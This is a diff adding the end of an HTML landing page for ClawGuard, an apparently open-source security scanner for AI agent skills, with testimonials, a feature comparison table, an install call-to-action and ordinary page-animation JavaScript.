+          </div>
+        </div>
+      </div>
+      <div class="testimonial">
+        <p class="testimonial-text">
+          "We run clawguard gate in CI before any skill gets deployed. 
+          It's blocked three malicious skills in the last month alone."
+        </p>
+        <div class="testimonial-author">
+          <div class="testimonial-avatar">D</div>
+          <div>
+            <div class="testimonial-name">DevOps Engineer</div>
+            <div class="testimonial-role">AI Startup</div>
+          </div>
+        </div>
+      </div>
+      <div class="testimonial">
+        <p class="testimonial-text">
+          "The honeypot sandbox is genius. When a skill touched our fake AWS keys, 
+          we knew instantly it was malicious. No guessing."
+        </p>
+        <div class="testimonial-author">
+          <div class="testimonial-avatar">S</div>
+          <div>
+            <div class="testimonial-name">Platform Lead</div>
+            <div class="testimonial-role">Agent Framework</div>
+          </div>
+        </div>
+      </div>
+      <div class="testimonial">
+        <p class="testimonial-text">
+          "Finally, security for the AI agent ecosystem. This should be mandatory 
+          for every agent platform."
+        </p>
+        <div class="testimonial-author">
+          <div class="testimonial-avatar">R</div>
+          <div>
+            <div class="testimonial-name">CTO</div>
+            <div class="testimonial-role">Enterprise AI Company</div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Comparison Table -->
+  <section>
+    <div class="section-header">
+      <div class="section-label">Comparison</div>
+      <h2 class="section-title">ClawGuard vs Traditional Scanners</h2>
+    </div>
+
+    <div class="comparison">
+      <table>
+        <thead>
+          <tr>
+            <th>Feature</th>
+            <th>ClawGuard</th>
+            <th>Pattern Scanners</th>
+            <th>Antivirus</th>
+          </tr>
+        </thead>
+        <tbody>
+          <tr>
+            <td class="feature-name">Understands code intent</td>
+            <td><span class="check">✓</span></td>
+            <td><span class="cross">✗</span></td>
+            <td><span class="cross">✗</span></td>
+          </tr>
+          <tr>
+            <td class="feature-name">Catches novel attacks</td>
+            <td><span class="check">✓</span></td>
+            <td><span class="cross">✗</span></td>
+            <td><span class="cross">✗</span></td>
+          </tr>
+          <tr>
+            <td class="feature-name">Multi-skill attack chains</td>
+            <td><span class="check">✓</span></td>
+            <td><span class="cross">✗</span></td>
+            <td><span class="cross">✗</span></td>
+          </tr>
+          <tr>
+            <td class="feature-name">Behavioral sandbox</td>
+            <td><span class="check">✓</span></td>
+            <td><span class="cross">✗</span></td>
+            <td><span class="check">✓</span></td>
+          </tr>
+          <tr>
+            <td class="feature-name">AI agent-specific threats</td>
+            <td><span class="check">✓</span></td>
+            <td><span class="cross">✗</span></td>
+            <td><span class="cross">✗</span></td>
+          </tr>
+          <tr>
+            <td class="feature-name">Prompt injection detection</td>
+            <td><span class="check">✓</span></td>
+            <td><span class="cross">✗</span></td>
+            <td><span class="cross">✗</span></td>
+          </tr>
+          <tr>
+            <td class="feature-name">Pre-install blocking</td>
+            <td><span class="check">✓</span></td>
+            <td><span class="check">✓</span></td>
+            <td><span class="cross">✗</span></td>
+          </tr>
+          <tr>
+            <td class="feature-name">Local/private option</td>
+            <td><span class="check">✓</span></td>
+            <td><span class="check">✓</span></td>
+            <td><span class="check">✓</span></td>
+          </tr>
+        </tbody>
+      </table>
+    </div>
+  </section>
+
+  <!-- CTA Section -->
+  <section class="cta-section">
+    <h2 class="cta-title">Protect Your Agents Today</h2>
+    <p class="cta-subtitle">
+      One command to install. Zero config for basic scans. 
+      Full protection in minutes.
+    </p>
+    <div class="cta-buttons">
+      <a href="#install" class="btn btn-primary">
+        Get Started
+      </a>
+      <a href="https://github.com/mikecavallo/clawguard" class="btn btn-secondary" target="_blank">
+        Read the Docs
+      </a>
+    </div>
+  </section>
+
+  <footer>
+    <div class="footer-links">
+      <a href="https://github.com/mikecavallo/clawguard" target="_blank">GitHub</a>
+      <a href="https://www.npmjs.com/package/@dribgib/clawguard" target="_blank">npm</a>
+      <a href="https://openclaw.ai" target="_blank">OpenClaw</a>
+      <a href="https://clawhub.com" target="_blank">ClawHub</a>
+    </div>
+    <p class="footer-copy">
+      © 2026 ClawGuard. Open source under MIT license.
+    </p>
+  </footer>
+
+  <script>
+    // Copy install command
+    function copyInstall(btn) {
+      navigator.clipboard.writeText('npm install -g @dribgib/clawguard');
+      btn.classList.add('copied');
+      btn.innerHTML = `<svg width="20" height="20" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+        <polyline points="20 6 9 17 4 12"></polyline>
+      </svg>`;
+      setTimeout(() => {
+        btn.classList.remove('copied');
+        btn.innerHTML = `<svg width="20" height="20" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+          <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
+          <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path>
+        </svg>`;
+      }, 2000);
+    }
+
+    // Generate floating particles
+    const particlesContainer = document.getElementById('particles');
+    for (let i = 0; i < 20; i++) {
+      const particle = document.createElement('div');
+      particle.className = 'particle';
+      particle.style.left = Math.random() * 100 + '%';
+      particle.style.animationDelay = Math.random() * 15 + 's';
+      particle.style.animationDuration = (15 + Math.random() * 10) + 's';
+      particlesContainer.appendChild(particle);
+    }
+
+    // Smooth scroll for anchor links
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+      anchor.addEventListener('click', function(e) {
+        e.preventDefault();
+        const target = document.querySelector(this.getAttribute('href'));
+        if (target) {
+          target.scrollIntoView({ behavior: 'smooth', block: 'start' });
+        }
+      });
+    });
+
+    // Intersection Observer for fade-in animations
+    const observerOptions = {
+      threshold: 0.1,
+      rootMargin: '0px 0px -50px 0px'
+    };
+
+    const observer = new IntersectionObserver((entries) => {
+      entries.forEach(entry => {
+        if (entry.isIntersecting) {
+          entry.target.style.opacity = '1';
+          entry.target.style.transform = 'translateY(0)';
+        }
+      });
+    }, observerOptions);
+
+    document.querySelectorAll('.layer, .feature-card').forEach(el => {
+      el.style.opacity = '0';
+      el.style.transform = 'translateY(20px)';
+      el.style.transition = 'opacity 0.6s ease-out, transform 0.6s ease-out';
+      observer.observe(el);
+    });
+  </script>
+</body>
+</html>
